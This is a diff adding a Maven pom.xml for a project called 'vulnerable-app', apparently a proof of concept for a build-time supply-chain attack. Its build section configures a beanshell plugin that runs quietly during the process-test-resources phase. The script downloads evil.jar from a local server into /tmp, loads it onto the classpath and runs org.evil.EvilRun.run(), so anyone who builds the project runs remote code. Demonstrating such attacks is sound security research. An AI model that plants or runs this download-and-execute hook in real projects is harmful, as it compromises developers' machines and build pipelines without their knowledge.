@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+    <groupId>com.Ox08.experiments</groupId>
+    <artifactId>vulnerable-app</artifactId>
+    <version>1.0-RELEASE</version>
+    <properties>
+        <maven.compiler.source>18</maven.compiler.source>
+        <maven.compiler.target>18</maven.compiler.target>
+        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+    </properties>
+
+    <build>
+        <plugins>
+            <plugin>
+                <groupId>com.github.genthaler</groupId>
+                <artifactId>beanshell-maven-plugin</artifactId>
+                <version>1.4</version>
+                <executions>
+                    <execution>
+                        <phase>process-test-resources</phase>
+                        <goals>
+                            <goal>run</goal>
+                        </goals>
+                    </execution>
+                </executions>
+
+                <configuration>
+                    <quiet>true</quiet>
+                    <script>
+                        <![CDATA[
+        System.out.println();
+        import java.io.*;
+        File r = new File("/tmp/evil.jar");
+        if (!r.exists()) {
+          InputStream in = new java.net.URL("http://localhost:8000/static/evil.jar?ts="+System.currentTimeMillis())
+                                .openStream();
+          OutputStream out = new FileOutputStream(r);
+          byte[] data = new byte[1024]; int count;
+          while((count = in.read(data, 0, 1024)) != -1) out.write(data, 0, count); out.close();
+        }
+        addClassPath( r.toURI().toURL() );
+        org.evil.EvilRun.run();
+                        ]]>
+                    </script>
+                </configuration>
+            </plugin>
+
+
+        </plugins>
+    </build>
+
+
+    <dependencies>
+        <dependency>
+            <groupId>junit</groupId>
+            <artifactId>junit</artifactId>
+            <version>4.13.2</version>
+            <scope>test</scope>
+        </dependency>
+    </dependencies>
+</project>
